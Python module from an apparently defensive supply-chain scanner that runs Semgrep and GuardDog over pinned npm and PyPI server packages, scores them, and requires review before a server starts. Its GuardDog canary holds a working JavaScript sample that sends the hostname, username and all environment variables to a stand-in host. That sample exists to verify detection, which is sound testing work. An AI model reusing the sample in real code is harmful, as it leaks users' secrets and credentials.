"""Stage 1 B code-behavior analysis: Semgrep CE over the pinned server code (D6-30).

Semgrep is a separate LGPL-2.1 program. It is run as a subprocess and is not
bundled or modified. Only our own rules (``rule_sets.semgrep_static_rules``)
are passed to it; Semgrep Registry rules are never used, because their license
does not cover a product or service like this one. Metrics and the version
check are off, and nothing is sent to Semgrep's servers.

The scan runs after stage 1 has pinned the code (``verify_stage1``), so the
report is tied to exactly the files that will run. Findings are B signals:
they hold a server for review until someone accepts them; they never block.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import tempfile
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from rule_sets.semgrep_static_rules import SEMGREP_STATIC_RULES, export_semgrep_config

STAGE = "1-integration"
UNAVAILABLE = "B_CODE_SCAN_UNAVAILABLE"  # the engine did not run or gave no result
INCOMPLETE = "B_CODE_SCAN_INCOMPLETE"  # some code files were not analysed
SIMILAR = "B_CODE_KNOWN_MALWARE_SIMILAR"  # evidence: a file close to known malware (D6-36)
SCORE_HELD = "B_SCORE_HELD"  # a package held by its B signals (rule) or score (model)
GAP_CODES = frozenset({UNAVAILABLE, INCOMPLETE, "B_GUARDDOG_UNAVAILABLE"})  # could not check: review
# Files Semgrep analyses with our rules; others (e.g. JSON, native .node) are not code here.
CODE_SUFFIXES = frozenset({".py", ".js", ".mjs", ".cjs", ".jsx", ".ts", ".mts", ".cts", ".tsx"})
DEFAULT_TIMEOUT_SECONDS = 600
# Remove settings that could add rules or log in to Semgrep's service.
_DROPPED_ENV = ("SEMGREP_RULES", "SEMGREP_APP_TOKEN", "SEMGREP_REPO_NAME", "SEMGREP_REPO_URL")
_RULE_CODES = {spec.semgrep_id: spec.rule.rule_id for spec in SEMGREP_STATIC_RULES}


def rules_sha256() -> str:
    """Digest of the rules a report was made with; a rule change needs a new scan."""
    return _sha256_json(export_semgrep_config())


def code_pin(entry: dict[str, Any]) -> str:
    """Digest of what stage 1 pinned: command, arguments, and the stage1 hashes.

    ``verify_stage1`` has already checked the files against these hashes, so a
    report with the same pin was made over the same code.
    """
    return _sha256_json({"command": entry.get("command"), "args": entry.get("args", []),
                         "stage1": entry.get("stage1")})


def scan_targets(entry: dict[str, Any]) -> list[Path]:
    """The pinned code: the install tree for npm/PyPI, the pinned files for local."""
    spec = entry.get("stage1") if isinstance(entry.get("stage1"), dict) else {}
    provider = spec.get("provider")
    if provider in {"npm", "pypi"}:
        return [Path(spec["install_root"])]
    if provider == "local":
        return [Path(name) for name in spec.get("files", {})]
    return []  # Docker images are not scanned (D6-34); the wrapper does not ask for a report


def find_semgrep(configured: str = "") -> str | None:
    """Absolute path of the engine: Semgrep runs in a temporary working folder."""
    for candidate in (configured, os.environ.get("MCP_GUARD_SEMGREP", "")):
        if candidate:
            found = str(Path(candidate).resolve()) if Path(candidate).is_file() else shutil.which(candidate)
            return found
    return shutil.which("semgrep")


# per-package features (D6-35) ---------------------------------------------------

# Signals the stage 1 B score combines, in a fixed order. The training script
# (mvp/10-local-entry/b_score) and the scan call the same function, so training and use
# compute features the same way.
SCORED_RULE_CODES = tuple(sorted({spec.rule.rule_id for spec in SEMGREP_STATIC_RULES}))
# D6-37: package manifest metadata GuardDog 3.2.0 no longer checks, and
# GuardDog's own verdict (rules and risk label) on the same files.
META_FEATURES = ("meta_no_description", "meta_no_repository", "meta_no_license",
                 "meta_release_zero", "meta_no_readme")
GD_FEATURES = ("GD_CAPABILITY", "GD_THREAT", "GD_RISK_LOW", "GD_RISK_SUSPICIOUS", "GD_RISK_HIGH")
FEATURES = ("lookalike_name", "install_script", "ships_pth", *SCORED_RULE_CODES,
            *META_FEATURES, *GD_FEATURES)
_NPM_HOOKS = ("preinstall", "install", "postinstall")
_UNKNOWN = {"", "unknown", "none", "n/a"}


def manifest_metadata(ecosystem: str, files: list[str], package_json: dict[str, Any] | None = None,
                      metadata_text: str | None = None) -> dict[str, int]:
    """Manifest gaps: no description, no repository or homepage, no licence,
    version 0.0.0, no readme. npm reads package.json; PyPI reads the
    METADATA (wheel) or PKG-INFO (sdist) text, the same header format.
    """
    if ecosystem == "npm":
        meta = package_json or {}
        text = lambda key: str(meta.get(key) or "").strip().lower()  # noqa: E731
        readme = any(f.split("/")[-1].lower().startswith("readme") and "/" not in f for f in files)
        return {"meta_no_description": int(text("description") in _UNKNOWN),
                "meta_no_repository": int(not meta.get("repository") and not meta.get("homepage")),
                "meta_no_license": int(not meta.get("license") and not meta.get("licenses")),
                "meta_release_zero": int(text("version") in {"0", "0.0", "0.0.0"}),
                "meta_no_readme": int(not readme)}
    if ecosystem == "pypi" and metadata_text is not None:
        from email.parser import HeaderParser

        message = HeaderParser().parsestr(metadata_text)
        value = lambda key: str(message.get(key) or "").strip().lower()  # noqa: E731
        classifiers = message.get_all("Classifier") or []
        body = (message.get_payload() or "").strip() if not message.is_multipart() else "x"
        return {"meta_no_description": int(value("Summary") in _UNKNOWN),
                "meta_no_repository": int(value("Home-page") in _UNKNOWN and not message.get_all("Project-URL")
                                          and value("Download-URL") in _UNKNOWN),
                "meta_no_license": int(value("License") in _UNKNOWN and value("License-Expression") in _UNKNOWN
                                       and not any(c.startswith("License ::") for c in classifiers)),
                "meta_release_zero": int(value("Version") in {"0", "0.0", "0.0.0"}),
                "meta_no_readme": int(not body and value("Description") in _UNKNOWN)}
    return {name: 0 for name in META_FEATURES}


def guarddog_features(result: dict[str, Any] | None) -> dict[str, int]:
    """GuardDog's verdict on one package as features (D6-37); None = not run."""
    if not result:
        return {name: 0 for name in GD_FEATURES}
    rules = result.get("rules", [])
    label = result.get("label", "")
    return {"GD_CAPABILITY": int(any(r.startswith("capability-") for r in rules)),
            "GD_THREAT": int(any(r.startswith("threat-") for r in rules)),
            "GD_RISK_LOW": int(label == "low"), "GD_RISK_SUSPICIOUS": int(label == "suspicious"),
            "GD_RISK_HIGH": int(label == "high_risk")}


def package_features(name: str, ecosystem: str, files: list[str], hit_codes: set[str],
                     package_json: dict[str, Any] | None = None,
                     popular: tuple[str, ...] | None = None,
                     metadata_text: str | None = None,
                     guarddog: dict[str, Any] | None = None) -> dict[str, int]:
    """0/1 per signal for one package.

    ``files`` are the package's paths relative to where it is installed (the
    npm package folder, or site-packages for PyPI); ``hit_codes`` are the
    Semgrep rule codes found in those files; ``package_json`` is npm metadata;
    ``metadata_text`` the PyPI METADATA/PKG-INFO text; ``guarddog`` GuardDog's
    summarised result for the same files.
    """
    from mcp_guard.dependencies import _popular, lookalike

    names = _popular(ecosystem) if popular is None else popular
    scripts = (package_json or {}).get("scripts")
    install_script = int(ecosystem == "npm" and (
        (isinstance(scripts, dict) and any(hook in scripts for hook in _NPM_HOOKS))
        or bool((package_json or {}).get("gypfile"))))
    # A top-level .pth file runs code at every Python start-up.
    ships_pth = int(ecosystem == "pypi" and any(f.endswith(".pth") and "/" not in f for f in files))
    features = {"lookalike_name": int(bool(name) and lookalike(name, names, ecosystem) is not None),
                "install_script": install_script, "ships_pth": ships_pth}
    features.update({code: int(code in hit_codes) for code in SCORED_RULE_CODES})
    features.update(manifest_metadata(ecosystem, files, package_json, metadata_text))
    features.update(guarddog_features(guarddog))
    return features


# GuardDog (D6-37) ----------------------------------------------------------------

GUARDDOG_UNAVAILABLE = "B_GUARDDOG_UNAVAILABLE"
GUARDDOG_IMAGE = "ghcr.io/datadog/guarddog:3.2.0"
# GuardDog 3.2.0 is supported on Windows only as a Docker image.
DEFAULT_GUARDDOG_COMMAND = ("docker", "run", "--rm", "--network", "none", "-v", "{path}:/scan:ro",
                            GUARDDOG_IMAGE, "{ecosystem}", "scan", "/scan", "--output-format=json")
_CANARY = (
    'const os = require("os"); const https = require("https");\n'
    'const data = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, e: process.env });\n'
    'const req = https.request({ hostname: "collector.example", path: "/x", method: "POST" }, () => {});\n'
    'req.write(data); req.end();\n')


def run_guarddog_dir(path: Path, ecosystem: str, command: tuple[str, ...] = DEFAULT_GUARDDOG_COMMAND,
                     timeout: int = 300) -> dict[str, Any]:
    """GuardDog over one folder: {"rules", "score", "label"} or {"error"}."""
    argv = [part.replace("{path}", str(path)).replace("{ecosystem}", ecosystem) for part in command]
    try:
        completed = subprocess.run(argv, capture_output=True, timeout=timeout, check=False)
        output = json.loads(completed.stdout.decode("utf-8", "replace") or "{}")
    except (OSError, subprocess.TimeoutExpired, ValueError) as error:
        return {"error": f"guarddog did not run: {error}"}
    if not isinstance(output, dict) or "results" not in output:
        stderr = completed.stderr.decode("utf-8", "replace").strip().splitlines()
        return {"error": f"guarddog gave no result: {stderr[-1] if stderr else ''}"}
    risk = output.get("risk_score") if isinstance(output.get("risk_score"), dict) else {}
    return {"rules": sorted(rule for rule, hits in output["results"].items() if hits),
            "score": risk.get("score"), "label": risk.get("label", ""),
            "errors": sorted(output.get("errors") or {})}


def guarddog_canary(command: tuple[str, ...] = DEFAULT_GUARDDOG_COMMAND) -> str | None:
    """None if GuardDog flags a known exfiltration sample, else why not.

    A GuardDog run that silently finds nothing would look clean; a canary
    with a known answer tells the two apart.
    """
    with tempfile.TemporaryDirectory(prefix="mcp-guard-canary-") as folder:
        (Path(folder) / "index.js").write_text(_CANARY, encoding="utf-8")
        (Path(folder) / "package.json").write_text('{"name": "canary", "version": "1.0.0"}', encoding="utf-8")
        result = run_guarddog_dir(Path(folder), "npm", command)
    if "error" in result:
        return result["error"]
    if "threat-network-exfil-sysinfo" not in result["rules"]:
        return "guarddog canary was not detected; results would look clean without being checked"
    return None


def guarddog_packages(entry: dict[str, Any], settings: dict[str, Any]) -> dict[str, Any]:
    """GuardDog over each installed package's own files (D6-37).

    Each package is copied to its own folder first: GuardDog scans a folder as
    one package, and npm packages nest their dependencies.
    """
    from concurrent.futures import ThreadPoolExecutor

    spec = entry.get("stage1") if isinstance(entry.get("stage1"), dict) else {}
    provider = spec.get("provider")
    command = tuple(settings.get("command") or DEFAULT_GUARDDOG_COMMAND)
    problem = guarddog_canary(command)
    if problem:
        return {"status": "unavailable", "reason": problem, "results": {}}
    units = _units(provider, spec)
    results: dict[str, Any] = {}
    with tempfile.TemporaryDirectory(prefix="mcp-guard-guarddog-") as work:
        jobs = []
        for n, unit in enumerate(units):
            folder = Path(work) / f"p{n:05d}"
            for name in unit["files"]:
                if name.startswith("../"):
                    continue
                source = (unit["root"] / name)
                target = folder / name
                target.parent.mkdir(parents=True, exist_ok=True)
                try:
                    shutil.copyfile(source, target)
                except OSError:
                    continue
            jobs.append((f"{unit['name']}@{unit['version']}", folder))
        with ThreadPoolExecutor(max_workers=int(settings.get("workers", 4))) as pool:
            done = pool.map(lambda job: (job[0], run_guarddog_dir(job[1], provider, command)), jobs)
            results = dict(done)
    failed = [label for label, result in results.items() if "error" in result]
    return {"status": "ok" if not failed else "incomplete", "failed": failed, "results": results}


def run_semgrep(targets: list[Path], semgrep: str | None,
                timeout: int = DEFAULT_TIMEOUT_SECONDS) -> dict[str, Any]:
    """Scan ``targets`` with our rules; return the report body (no server or pin)."""
    body: dict[str, Any] = {"engine": "semgrep", "engine_version": "",
                            "rules_sha256": rules_sha256(),
                            "targets": [str(t) for t in targets], "scanned_files": 0,
                            "findings": []}
    if not targets:
        return _unavailable(body, "no pinned source code to scan (Docker images are not scanned)")
    if not semgrep:
        return _unavailable(body, "semgrep is not installed (pip install semgrep, or set "
                                  "code_scan.semgrep / MCP_GUARD_SEMGREP)")
    env = {k: v for k, v in os.environ.items() if k not in _DROPPED_ENV}
    # Semgrep's Windows support is beta and needs UTF-8 mode.
    env.update(PYTHONUTF8="1", SEMGREP_SEND_METRICS="off", SEMGREP_ENABLE_VERSION_CHECK="0")
    with tempfile.TemporaryDirectory(prefix="mcp-guard-semgrep-") as work:
        config = Path(work) / "mcp-guard-rules.json"
        config.write_text(json.dumps(export_semgrep_config()), encoding="utf-8")
        command = [
            semgrep, "scan", "--config", str(config), "--json", "--quiet",
            "--metrics=off", "--disable-version-check",
            # Package code lives under node_modules/ and may include tests/;
            # Semgrep's default ignore list would skip both.
            "--x-ignore-semgrepignore-files", "--no-git-ignore",
            # The default skips files over 1 MB, which padding could exploit.
            "--max-target-bytes", "0",
            "--timeout", "60",
            *(str(t) for t in targets),
        ]
        try:
            completed = subprocess.run(command, capture_output=True, cwd=work, env=env,
                                       timeout=timeout, check=False)
        except (OSError, subprocess.TimeoutExpired) as error:
            return _unavailable(body, f"semgrep did not finish: {error}")
        try:
            output = json.loads(completed.stdout.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            stderr = completed.stderr.decode("utf-8", "replace").strip().splitlines()
            return _unavailable(body, f"semgrep exited {completed.returncode} without a "
                                      f"JSON result: {stderr[-1] if stderr else ''}")
        return _parse(body, output, targets, Path(work))


def _parse(body: dict[str, Any], output: dict[str, Any], targets: list[Path],
           cwd: Path) -> dict[str, Any]:
    body["engine_version"] = str(output.get("version", ""))
    findings = body["findings"]
    for result in output.get("results", []):
        check_id = str(result.get("check_id", ""))
        # check_id is prefixed with the config file's location; ours end in the id.
        code = next((c for sid, c in _RULE_CODES.items()
                     if check_id == sid or check_id.endswith("." + sid)), None)
        if code is None:
            continue  # not one of our rules; never act on a rule we did not ship
        findings.append({"code": code, "path": str(_resolve(cwd, result.get("path", ""))),
                         "line": int(result.get("start", {}).get("line", 0)),
                         "message": str(result.get("extra", {}).get("message", ""))})
    for error in output.get("errors", []):
        findings.append({"code": INCOMPLETE, "path": str(error.get("path", "")), "line": 0,
                         "message": f"semgrep {error.get('type', 'error')}: "
                                    f"{str(error.get('message', ''))[:300]}"})
    scanned = {_resolve(cwd, p) for p in output.get("paths", {}).get("scanned", [])}
    body["scanned_files"] = len(scanned)
    code_files = _code_files(targets)
    for path in sorted(code_files - scanned):
        findings.append({"code": INCOMPLETE, "path": str(path), "line": 0,
                         "message": "code file was not analysed"})
    # Semgrep lists a file as scanned even when it could not open it, e.g. when
    # an antivirus refuses to open a detected file; its rules then miss it.
    for path in sorted(code_files & scanned):
        try:
            with path.open("rb") as stream:
                stream.read(1)
        except OSError as error:
            findings.append({"code": INCOMPLETE, "path": str(path), "line": 0,
                             "message": "code file could not be read (an antivirus may have "
                                        f"blocked it): {error.strerror or error}"})
    return body


def similar_to_known_malware(body: dict[str, Any], targets: list[Path],
                             entry: dict[str, Any] | None = None,
                             feed: dict[str, str] | None = None) -> dict[str, Any]:
    """Evidence: a finding for every code file close to known malware (D6-36).

    The index (src/mcp_guard/data/known_malware_index.json) holds signatures of
    files that carried a Semgrep signal in human-triaged malware packages, minus
    anything matching benign packages. A match is evidence for the reviewer and
    the review aid; it does not raise review by itself: on held-out data it
    added no malicious package the review signals had not already held, and
    lookalike malware copies real libraries' code.

    Files of popular packages (the lookalike list) are not compared: malware
    copies them, not the other way round. Without an index nothing is added.
    """
    from mcp_guard import similarity
    from mcp_guard.dependencies import _normalize, _popular

    if feed:
        from mcp_guard.similarity_feed import checked_snapshot

        snapshot = json.loads(checked_snapshot(feed["path"], feed["sha256"]))
        index = similarity.load_index(feed["path"])
        if index is None:
            raise ValueError("pinned similarity feed could not be loaded")
        body["similarity_feed"] = {"source": feed["url"], "sha256": feed["sha256"],
                                   "snapshot_date": snapshot.get("date"),
                                   "variant": snapshot.get("variant"),
                                   "dataset_source": snapshot.get("source")}
    else:
        index = similarity.load_index()
        body["similarity_feed"] = {"source": "bundled"}
    body["similarity_index"] = "loaded" if index is not None else "absent"
    if index is None:
        return body
    skip: set[Path] = set()
    spec = (entry or {}).get("stage1") if isinstance((entry or {}).get("stage1"), dict) else {}
    provider = spec.get("provider")
    if provider in {"npm", "pypi"}:
        popular = {_normalize(n) for n in _popular(provider)}
        for unit in _units(provider, spec):
            if _normalize(unit["name"]) in popular:
                skip |= unit["paths"]
    for path in sorted(_code_files(targets) - skip):
        sig = similarity.file_signature(path)
        match = index.best(sig) if sig is not None else None
        if match is not None:
            body["findings"].append({
                "code": SIMILAR, "path": str(path), "line": 0,
                "message": f"code is close to known malware {match.label} "
                           f"(estimated similarity {match.jaccard})"})
    return body


def _code_files(targets: list[Path]) -> set[Path]:
    files: set[Path] = set()
    for target in targets:
        if target.is_file():
            if target.suffix.lower() in CODE_SUFFIXES or not target.suffix:  # "" = a script
                files.add(target.resolve())
            continue
        for path in target.rglob("*"):
            if path.suffix.lower() in CODE_SUFFIXES and path.is_file() and not path.is_symlink():
                files.add(path.resolve())
    return files


def _resolve(cwd: Path, path: str) -> Path:
    return (cwd / path).resolve()


def _unavailable(body: dict[str, Any], message: str) -> dict[str, Any]:
    body["findings"].append({"code": UNAVAILABLE, "path": "", "line": 0, "message": message})
    return body


# B score per package (D6-35) -------------------------------------------------


def score_packages(entry: dict[str, Any], body: dict[str, Any],
                   guarddog: dict[str, Any] | None = None) -> list[dict[str, Any]]:
    """The B score of every package that has a signal (stage 1, D6-35).

    Semgrep findings are assigned to the installed package whose files they are
    in; files outside any package (the pinned files of a ``local`` server, or a
    project's own files) form one unnamed unit.
    """
    from mcp_guard.b_score import score

    spec = entry.get("stage1") if isinstance(entry.get("stage1"), dict) else {}
    provider = spec.get("provider")
    hits: dict[Path, set[str]] = {}
    evidence: dict[Path, list[dict[str, Any]]] = {}
    for finding in body.get("findings", []):
        if finding["code"] in {*SCORED_RULE_CODES, SIMILAR} and finding.get("path"):
            path = Path(finding["path"]).resolve()
            hits.setdefault(path, set()).add(finding["code"])
            evidence.setdefault(path, []).append(
                {k: finding[k] for k in ("code", "path", "line", "message") if k in finding})
    results, claimed = [], set()
    for unit in _units(provider, spec):
        claimed |= unit["paths"]
        found = set().union(*(hits.get(path, set()) for path in unit["paths"]))
        gd = (guarddog or {}).get("results", {}).get(f"{unit['name']}@{unit['version']}")
        gd = gd if gd and "error" not in gd else None
        features = package_features(unit["name"], provider, unit["files"], found, unit["package_json"],
                                    metadata_text=unit["metadata_text"], guarddog=gd)
        missing = set() if gd is not None else set(GD_FEATURES)
        if any(features.values()):
            results.append({"name": unit["name"], "version": unit["version"],
                            "description": _description(unit),
                            "score": score(features, missing=missing, ecosystem=provider or ""),
                            "evidence": [e for path in sorted(unit["paths"] & hits.keys())
                                         for e in evidence[path]][:20]})
    rest = set().union(*(codes for path, codes in hits.items() if path not in claimed))
    if rest:
        features = package_features("", provider if provider in {"npm", "pypi"} else "local", [], rest)
        results.append({"name": "", "version": "", "score": score(features),
                        "evidence": [e for path, items in sorted(evidence.items()) if path not in claimed
                                     for e in items][:20]})
    return results


def _description(unit: dict[str, Any]) -> str:
    """The package's own one-line description (untrusted text, for the review aid)."""
    if unit.get("package_json"):
        return str(unit["package_json"].get("description") or "")[:500]
    if unit.get("metadata_text"):
        from email.parser import HeaderParser

        return str(HeaderParser().parsestr(unit["metadata_text"]).get("Summary") or "")[:500]
    return ""


def _units(provider: Any, spec: dict[str, Any]) -> list[dict[str, Any]]:
    if provider not in {"npm", "pypi"}:
        return []
    from mcp_guard.dependencies import installed_packages

    root = Path(spec["install_root"]).resolve()
    packages, _ = installed_packages(provider, root)
    units = []
    for package in packages:
        metadata_text = None
        if provider == "npm":
            folder = root / package["path"]
            paths = {(folder / name).resolve() for name in package["files"]}
            try:
                meta = json.loads((folder / "package.json").read_text(encoding="utf-8"))
            except (OSError, ValueError):
                meta = None
        else:
            folder = site = root / package["site"]
            paths = {((root / name[3:]) if name.startswith("../") else (site / name)).resolve()
                     for name in package["files"]}
            meta = None
            metadata = site / package["path"].split("/")[-1] / "METADATA"
            try:
                metadata_text = metadata.read_text(encoding="utf-8", errors="replace")
            except OSError:
                metadata_text = None
        units.append({"name": package["name"], "version": package["version"],
                      "files": list(package["files"]), "paths": paths, "root": folder,
                      "package_json": meta if isinstance(meta, dict) else None,
                      "metadata_text": metadata_text})
    return units


def review_items(report: dict[str, Any]) -> list[dict[str, Any]]:
    """What must be accepted before the server starts.

    Gaps (the engine did not run, a file was not analysed) always; packages
    whose B score reached the threshold. Reports made before D6-35 have no
    package scores, and every finding of theirs needs review.
    """
    findings = report.get("findings", [])
    if "packages" not in report:
        return findings
    return ([f for f in findings if f["code"] in GAP_CODES] +
            [p for p in report["packages"] if p["score"]["raise_review"]])


def review_codes(report: dict[str, Any] | None) -> tuple[str, ...]:
    return tuple(sorted({item.get("code", SCORE_HELD) for item in review_items(report or {})}))


# reports -------------------------------------------------------------------


def report_path(reports_dir: str | Path, server: str) -> Path:
    return Path(reports_dir) / f"{server}.json"


def new_report(server: str, entry: dict[str, Any], body: dict[str, Any]) -> dict[str, Any]:
    return {"server": server, "pin": code_pin(entry),
            "scanned_at": datetime.now(UTC).isoformat(timespec="seconds"), **body,
            "findings_sha256": _sha256_json(body["findings"]), "accepted": None}


def write_report(path: Path, report: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_suffix(".tmp")
    temporary.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    os.replace(temporary, path)


def load_report(path: Path) -> dict[str, Any] | None:
    try:
        report = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    return report if isinstance(report, dict) else None


def accept(report: dict[str, Any], approver: str, user: str) -> dict[str, Any]:
    """Record that a reviewer accepted exactly the items that held the server."""
    return {**report, "accepted": {"approver": approver, "user": user,
                                   "at": datetime.now(UTC).isoformat(timespec="seconds"),
                                   "findings_sha256": _sha256_json(review_items(report))}}


def report_status(report: dict[str, Any] | None, entry: dict[str, Any],
                  feed: dict[str, str] | None = None) -> tuple[str, str]:
    """("ok" | "missing" | "stale" | "review", reason) for starting the server.

    missing and stale are A decisions (the required scan was not made over
    this code); review is the B outcome (findings not yet accepted).
    """
    if report is None:
        return "missing", "no code scan report; run: client_config scan"
    if report.get("pin") != code_pin(entry):
        return "stale", "server code pin changed since the code scan; scan again"
    if report.get("rules_sha256") != rules_sha256():
        return "stale", "code scan rules changed since the scan; scan again"
    if feed:
        recorded_feed = report.get("similarity_feed")
        if (not isinstance(recorded_feed, dict) or recorded_feed.get("source") != feed["url"] or
                recorded_feed.get("sha256") != feed["sha256"]):
            return "stale", "similarity feed pin changed since the scan; scan again"
        try:
            from mcp_guard.similarity_feed import checked_snapshot

            checked_snapshot(feed["path"], feed["sha256"], validate_schema=False)
        except ValueError as error:
            return "stale", str(error)
    items = review_items(report)
    accepted = report.get("accepted")
    if items and not (isinstance(accepted, dict) and
                      accepted.get("findings_sha256") == _sha256_json(items)):
        return "review", f"{len(items)} code scan item(s) wait for review; " \
                         "inspect the report, then run: client_config scan --accept"
    return "ok", ""


def finding_codes(report: dict[str, Any] | None) -> tuple[str, ...]:
    return tuple(sorted({f["code"] for f in (report or {}).get("findings", [])}))


def summary(report: dict[str, Any]) -> dict[str, Any]:
    """What the audit event keeps: counts and digests, not code paths or messages."""
    counts: dict[str, int] = {}
    for finding in report.get("findings", []):
        counts[finding["code"]] = counts.get(finding["code"], 0) + 1
    return {"engine": report.get("engine"), "engine_version": report.get("engine_version"),
            "similarity_feed": report.get("similarity_feed"),
            "rules_sha256": report.get("rules_sha256"), "pin": report.get("pin"),
            "scanned_files": report.get("scanned_files"), "finding_counts": counts,
            "findings_sha256": report.get("findings_sha256"),
            "accepted": bool(report.get("accepted")),
            **_score_summary(report.get("packages"))}


def _score_summary(packages: Any) -> dict[str, Any]:
    if not isinstance(packages, list):
        return {}
    held = [p for p in packages if p["score"]["raise_review"]]
    scores = [p["score"] for p in packages]
    return {"b_score": {
        "model": scores[0]["model"] if scores else "", "version": scores[0]["version"] if scores else "",
        "packages_with_signals": len(packages), "packages_held": len(held),
        "held": [{"package": f"{p['name']}@{p['version']}" if p["name"] else "(unpackaged)",
                  "probability": p["score"]["probability"], "threshold": p["score"]["threshold"],
                  "contributions": p["score"]["contributions"]} for p in held]}}


def _sha256_json(value: Any) -> str:
    raw = json.dumps(value, sort_keys=True, ensure_ascii=False, separators=(",", ":"))
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()
